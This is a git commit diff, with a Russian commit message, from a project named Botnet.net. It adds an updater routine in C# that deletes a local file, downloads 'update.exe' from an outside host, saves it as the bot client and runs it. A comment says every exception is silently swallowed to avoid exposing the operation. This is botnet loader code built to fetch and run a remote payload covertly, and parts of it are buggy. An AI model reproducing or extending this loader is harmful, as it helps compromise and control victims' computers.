6ca53c9f54f75efcce15caa9893a03124bd12cf2
Andrew A <andreew.a.m@gmail.com>
2016-01-31 02:32:58 +0300

    добавлен базовый функционал в апдейтер, сука, не могу сменить ветку, поэтому делаю коммит в master

--- Botnet.net/Updater/Program.cs
+++ Botnet.net/Updater/Program.cs
@@ -3,6 +3,9 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.IO;
+using System.Net;
+using System.Diagnostics;
 
 namespace Updater
 {
@@ -10,6 +13,30 @@ namespace Updater
     {
         static void Main(string[] args)
         {
+            string pathToFile = @"D:\123.txt"; //путь к exe клиента бота
+            string url = "setver.net/update.exe";
+
+            //все исключения молча перехватывается, чтобы не палить контору.
+            try
+            {
+                File.Delete(pathToFile);
+
+                //скачивание и сохранение файла
+                WebClient wc = new WebClient();
+                Stream stream = wc.OpenRead(url);
+
+                byte[] data = new byte[stream.Length];
+                stream.Read(data, 0, (int)stream.Length);
+
+                FileStream fs = File.Create(pathToFile);
+                fs.Write(data, 0, data.Length);
+
+                //запуск бота
+                if (File.Exists(pathToFile))
+                    Process.Start(pathToFile);
+            }
+            catch (Exception e)
+            { }
         }
     }
 }
